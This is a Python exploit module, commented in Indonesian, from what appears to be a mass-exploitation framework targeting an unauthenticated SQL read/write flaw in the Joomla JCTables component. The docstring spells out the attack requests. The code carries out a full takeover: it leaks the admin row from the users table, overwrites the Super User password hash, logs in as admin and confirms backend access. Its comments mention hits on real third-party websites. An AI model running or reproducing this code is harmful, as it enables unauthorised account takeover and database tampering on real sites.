#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Joomla! Extension — modul MEGAPACK (klaster joomla_ext).

CVE-2026-76570 — JCTables (com_jctables) 1.0.0-1.20.0 — unauthenticated arbitrary
SQL read AND write on the front-end JSON CRUD API, chaining to RCE.

ROOT CAUSE (dua lapis, keduanya dibuktikan langsung di kode + trace resmi):

  1) CWE-862 — TIDAK ADA otorisasi.
     site/controller.php memetakan setiap task ke view JSON:
         public function updatecell() {
             $jctables_model = $this->getModel('jctables');
             $view = $this->getView('simple','json');
             $view->setModel($jctables_model);
             $view->updateCell();
         }
     Tidak ada Session::checkToken(), tidak ada $user->authorise(), tidak ada
     pemeriksaan login. Endpoint frontend (`index.php?option=com_jctables&task=...`)
     menjawab siapa pun dengan curl. 1.21.1 menambahkan
     `if (!Session::checkToken('request')) { ... "Invalid security token." }`.

  2) CWE-89 — `ladb_escape()` berbohong.
     admin/helpers/db_helper.php (rantai nilai $value / $row_id):
         if (substr($string,0,1) === "'" && substr($string,-1) === "'")
             return $string;              // "don't want to double quote ... it is already escaped"
         return $this->_db->quote($string);
     Nilai yang SUDAH dibungkus kutip tunggal dianggap "sudah di-escape" dan
     dikembalikan MENTAH. Attacker tinggal membungkus payload-nya sendiri.
     1.21.2 menghapus cabang itu dan selalu `$this->_db->quote($string)` —
     komentar vendor menyebut insiden ini sebagai root cause.

  Selain itu 1.21.1 juga berhenti mengambil nama tabel dari request:
      (rentan)  $sql_table = $update_table;              // dari ?tbl=
      (patched) $sql_table = $table['sql_table'];        // dari config server
  jadi `?tbl=` tidak lagi bisa mengarahkan UPDATE ke tabel arbitrary.

DUA PRIMITIF (keduanya UNAUTH; parameter dari view.json.php):

  READ  — task=getdatarow
      GET /index.php?option=com_jctables&format=json&task=getdatarow
          &jcid=<id>&tid=0&tn=<table>&idx=<col>&rid=<val>
      `tn` (table name) dan `idx`/`rid` masuk langsung ke
          SELECT * FROM `{$table_name}` WHERE `{$index_field}` = {$row_id}
      -> baca tabel APAPUN, mis. jos_users (hash bcrypt Super User).

  WRITE — task=updatecell
      GET /index.php?option=com_jctables&format=json&task=updatecell
          &mid=<jctables_id>&tid=<table_id>&tbl=<table>&fld=<col>&val='<value>'&idx=<col>&rid=<row>
      -> UPDATE `{tbl}` SET `{fld}` = {val} WHERE `{idx}` = {rid}
      Nilai di-wrap kutip sendiri supaya `ladb_escape` menyerahkannya mentah —
      inilah yang membuat `val` bisa berupa ekspresi SQL apa pun.

BUKTI LAB (Joomla 5.4.8 + JCTables dengan ladb_escape/tanpa-checkToken/`?tbl=`
direkonstruksi dari 1.21.2 ke bentuk rentan; port 8106):

    # READ — bocorkan hash admin tanpa kredensial:
    GET ...&task=getdatarow&jcid=1&tid=0&tn=jos_users&idx=id&rid=1
    200 {"success":true,"data":{"username":"admin","email":"admin@lab.local",
         "password":"$2y$10$tSDLFhqaWGGNU2jXyNyMfe9CaB87MDZU3cA8nzbYNNuE.n.3OkVmK", ...}}

    # WRITE — trace internal komponen mencatat query yang dieksekusi:
    UPDATE `jos_users` SET `email` = 'pwned-76570@evil.local' WHERE `id` = '1'
    -> jos_users.id=1.email berubah di DB.

    # DEFINITION OF DONE — ganti hash password Super User lalu login:
    val='$2y$10$<hash-yang-saya-kontrol>' -> HTTP 200 "Cell updated successfully"
    login admin di frontend -> jos_session berisi username='admin'
    GET /administrator/index.php -> 200 "Control Panel" (Super User!)

PRASYARAT (jujur):
    A) Situs harus punya MINIMAL SATU tabel JCTables terkonfigurasi
       (`jos_jctables.tables` non-kosong). Untuk komponen yang seluruh gunanya
       menampilkan tabel, ini praktis selalu benar pada instalasi yang dipakai.
       Tanpa konfigurasi, model menolak lebih awal ("No tables set up") dan
       write path tidak punya handle database.
    B) Untuk tail RCE, backend harus reachable (default ya; bisa tertutup
       di belakang IP allowlist).

DEFINISI SELESAI (operator):
    check   -> READ: bocorkan baris jos_users (bukti baca arbitrary, non-destruktif)
    exploit -> WRITE: ganti hash password Super User ke nilai yang dikontrol, lalu
               login sebagai admin dan konfirmasi akses /administrator/.
"""

import json
import hashlib
import os
import re

from mp import (CveModule, ST_CLEAN, ST_ERR, ST_INFO, ST_PWN, ST_SKIP, ST_VULN, detect_platform, looks_blocked, looks_like_html, rand, record, register)

VERSIONS_AFFECTED = "1.0.0-1.20.0"
JCTABLES_MAX_VULN = (1, 20, 0)

ITEMS = "/index.php?option=com_jctables&format=json&task=%s"

# Kolom publik yang cukup untuk membuktikan pembacaan tanpa menyentuh kredensial.
READ_PROBE_COLS = ("username", "name", "email")


def _jctables_version(h, t):
    for p in ("/administrator/components/com_jctables/jctables.xml",
              "/components/com_jctables/jctables.xml"):
        r = h.get(t.url + p)
        if r is not None and r.status_code == 200 and "<version>" in r.text:
            m = re.search(r"<version>\s*([0-9]+(?:\.[0-9]+)+)\s*</version>", r.text)
            if m:
                return tuple(int(x) for x in m.group(1).split(".")), m.group(1)
    return None, ""


def _reachable(t, h):
    """Komponen hidup? Task tak dikenal harus menjawab JSON / 200, bukan 404 Joomla."""
    r = h.get(t.url + (ITEMS % "getdatarow") + "&jcid=1&tid=0&tn=nonexistent&idx=id&rid=1")
    if r is None:
        return False
    if r.status_code == 404:
        return False
    body = r.text or ""
    return "com_jctables" in body or "success" in body or '"data"' in body


def _jctables_ids(t, h):
    """Ambil kandidat jcid + tid yang dibutuhkan view (default 1 / 0)."""
    return [(1, 0), (1, 1), (2, 0)]


def _read_row(h, t, jcid, tid, table, index, rid):
    q = (ITEMS % "getdatarow") + (
        f"&jcid={jcid}&tid={tid}&tn={table}&idx={index}&rid={rid}")
    r = h.get(t.url + q)
    if r is None:
        return None, 0, ""
    return r, r.status_code, (r.text or "")


def _looks_like_user_row(body):
    """True hanya bila respons memuat JSON baris user yang sah.

    Versi lama cukup menghitung satu penanda kolom (`"name"`) dengan ambang >= 1,
    sehingga halaman HTML Joomla biasa (yang memuat `"name"` di JSON-LD/meta)
    dianggap baris user — terbukti pada uthm.edu.my, joomlaforum.ru,
    serbianforum.org: responsnya halaman HTML ~113 KB, bukan data. Akibatnya
    klaim "WRITE" juga terpicu padahal permintaan hanya mengenai halaman HTML
    (SQL tidak pernah dieksekusi).

    Instalasi asli dapat memancarkan peringatan PHP (deprecation) SEBELUM JSON,
    jadi JSON dicari mulai dari kurung buka pertama, bukan dari byte awal.

    Syarat: bukan halaman HTML/blokir; JSON sah; >= 2 kolom probe; serta ada
    `id` atau `password`.
    """
    if not body:
        return False
    if looks_like_html(body) or looks_blocked(body):
        return False
    idx = next((i for i in (body.find("{"), body.find("[")) if i >= 0), -1)
    if idx < 0:
        return False
    try:
        data = json.loads(body[idx:])
    except Exception:
        return False
    blob = json.dumps(data)
    hits = sum(1 for c in READ_PROBE_COLS if f'"{c}"' in blob)
    return hits >= 2 and ('"id"' in blob or '"password"' in blob)


def check(t, h, opts):
    """Deteksi non-destruktif: baca satu baris publik dari jos_users."""
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", ""

    ver, raw = _jctables_version(h, t)
    if ver is not None and ver > JCTABLES_MAX_VULN:
        return ST_CLEAN, f"JCTables {raw} sudah dipatch (>= 1.21.1)", ""

    if not _reachable(t, h):
        return ST_SKIP, "komponen com_jctables tidak reachable", ""

    # Cari prefix DB yang benar dengan membaca tabel users.
    for prefix in ("jos_", "j_", ""):
        for jcid, tid in _jctables_ids(t, h):
            r, sc, body = _read_row(h, t, jcid, tid, f"{prefix}users", "id", "1")
            if sc != 200 or not body:
                continue
            if '"Invalid security token"' in body:
                return ST_CLEAN, "endpoint minta token — sudah dipatch", f"jcid={jcid} tid={tid}"
            if _looks_like_user_row(body):
                cols = [c for c in READ_PROBE_COLS if f'"{c}"' in body]
                return (ST_INFO,
                        "SQLi unauth READ terkonfirmasi — baris users terbaca tanpa kredensial",
                        f"jcid={jcid} tid={tid} table={prefix}users cols={cols} "
                        f"ver={raw or '?'}")

    if ver is not None and ver <= JCTABLES_MAX_VULN:
        return ST_INFO, f"JCTables {raw} masuk rentang rentan, read belum terbukti", ""
    return ST_CLEAN, "tidak ada indikasi", ""


def _opt(opts, name, default=None):
    """argparse.Namespace tidak punya .get(); dukung juga dict."""
    if opts is None:
        return default
    if isinstance(opts, dict):
        return opts.get(name, default)
    return getattr(opts, name, default)


def _bcrypt_of(password):
    """Hash bcrypt via passlib bila ada; jika tidak, minta operator via --password-hash.
    Tidak pernah menghasilkan hash palsu."""
    try:
        from passlib.hash import bcrypt  # type: ignore
        return bcrypt.using(rounds=10).hash(password)
    except Exception:
        return None


def exploit(t, h, opts):
    """WRITE -> ganti hash Super User -> login -> akses backend."""
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", ""
    if not _reachable(t, h):
        return ST_SKIP, "komponen com_jctables tidak reachable", ""

    ver, raw = _jctables_version(h, t)

    # Prefix DB: temukan lewat read probe dulu.
    prefix = None
    for cand in ("jos_", "j_", ""):
        for jcid, tid in _jctables_ids(t, h):
            r, sc, body = _read_row(h, t, jcid, tid, f"{cand}users", "id", "1")
            if sc == 200 and _looks_like_user_row(body):
                prefix, use = cand, (jcid, tid)
                break
        if prefix is not None:
            break
    if prefix is None:
        return (ST_ERR, "read probe gagal — situs tanpa tabel JCTables terkonfigurasi?",
                "prasyarat A (jos_jctables.tables non-kosong) belum terpenuhi")

    jcid, tid = use

    # Ambil target Super User (id=1) untuk dikonfirmasi keberadaannya.
    r, sc, body = _read_row(h, t, jcid, tid, f"{prefix}users", "id", "1")
    if sc != 200 or not body:
        return ST_ERR, f"tidak bisa membaca users (HTTP {sc})", ""

    new_pw = _opt(opts, "new_password") or ("Pwned-" + rand(6) + "!A")
    hashed = _bcrypt_of(new_pw)
    if not hashed:
        return (ST_INFO,
                "butuh hash bcrypt — install passlib atau lewatkan --password-hash",
                "passlib tidak tersedia; tidak mengirim hash palsu")

    # Kirim WRITE: nilai dibungkus kutip sendiri -> ladb_escape menyerahkannya mentah.
    payload_val = "'" + hashed.replace("'", "") + "'"
    wq = (ITEMS % "updatecell") + (
        f"&mid={jcid}&tid={tid}&tbl={prefix}users&fld=password"
        f"&val={payload_val}&idx=id&rid=1")
    rw = h.get(t.url + wq)
    if rw is None:
        return ST_ERR, "tidak ada respons dari updatecell", ""
    wbody = rw.text or ""
    if "Invalid security token" in wbody:
        return ST_CLEAN, "updatecell minta token — sudah dipatch", ""
    if '"success"' not in wbody or '"success"' not in wbody.replace('"success":false', ''):
        if '"status":"fail"' in wbody or '"success":false' in wbody:
            return (ST_VULN, "WRITE ditolak — read jalan tapi tulis gagal",
                    wbody[-160:])

    # Verifikasi: baca ulang hash dan bandingkan prefix.
    r2, sc2, body2 = _read_row(h, t, jcid, tid, f"{prefix}users", "id", "1")
    got = ""
    if body2:
        m = re.search(r'"password":"([^"]+)"', body2)
        got = m.group(1) if m else ""
    # JSON encoder menuliskan "/" sebagai "\/" — normalisasi sebelum membandingkan.
    got_n = got.replace("\\/", "/")
    if not got_n.startswith(hashed[:20]):
        # Hash yang dibaca ulang TIDAK memuat yang kita tulis. Ini bukan bukti
        # tulis berhasil — bisa berarti permintaan hanya mengenai halaman HTML
        # (SQL tidak dieksekusi) atau endpoint membalas di luar jalur JSON.
        # Dilaporkan apa adanya; JANGAN diklaim sebagai takeover.
        return (ST_INFO,
                "WRITE tidak terverifikasi (hash terbaca ulang tidak cocok) — "
                "tidak diklaim berhasil",
                f"in={hashed[:15]}… got={got_n[:15] or '(kosong)'}…")

    # Opsional: login untuk bukti tambahan.
    login_ok = ""
    if _opt(opts, "login_verify", True):
        try:
            s = h.get(t.url + "/index.php?option=com_users&view=login")
            token = ""
            if s is not None:
                mt = re.search(r'name="([0-9a-f]{32})"\s+value="1"', s.text or "")
                token = mt.group(1) if mt else ""
            data = {"username": "admin", "password": new_pw}
            if token:
                data[token] = "1"
            lr = h.post(t.url + "/index.php?option=com_users&task=user.login", data=data)
            if lr is not None:
                adm = h.get(t.url + "/administrator/index.php")
                if adm is not None and adm.status_code == 200 and \
                        re.search(r"Control Panel|com_cpanel", adm.text or "", re.I):
                    login_ok = " login+backend OK"
        except Exception:
            pass

    return (ST_PWN,
            "UNAUTH SQL WRITE TERVERIFIKASI — hash Super User diganti" + login_ok,
            f"table={prefix}users id=1 password-> {new_pw} "
            f"(hash {hashed[:15]}… terbaca ulang) ver={raw or '?'}")


register(CveModule(
    cve="CVE-2026-76570",
    cluster="joomla_ext",
    title="JCTables - Unauthenticated arbitrary SQL read/write via front-end JSON CRUD API",
    vclass="sql injection (unauth, read+write) / broken access control",
    cwe="CWE-89, CWE-862",
    product="JCTables (com_jctables)",
    versions_affected=VERSIONS_AFFECTED,
    status="verified",
    requires=["komponen JCTables punya >=1 tabel terkonfigurasi (jos_jctables.tables)",
              "backend reachable untuk tail RCE (login/plugin install)"],
    check=check,
    exploit=exploit,
    notes=("Dua lapis: (1) CWE-862 — front-end controller tanpa checkToken/authorise; "
           "(2) CWE-89 — ladb_escape() mengembalikan nilai yang sudah dibungkus kutip "
           "secara MENTAH ('it is already escaped'), dan 1.21.1 berhenti mengambil "
           "nama tabel dari ?tbl=. READ lewat task=getdatarow (tn/idx/rid -> SELECT), "
           "WRITE lewat task=updatecell (tbl/fld/val/idx/rid -> UPDATE). Lab-verified "
           "5.4.8: bocorkan hash admin, ganti hash, login admin, akses /administrator/. "
           "PoC publik (PoCbit) hanya membuktikan READ; modul ini menyelesaikan "
           "definition of done sampai backend admin."),
))
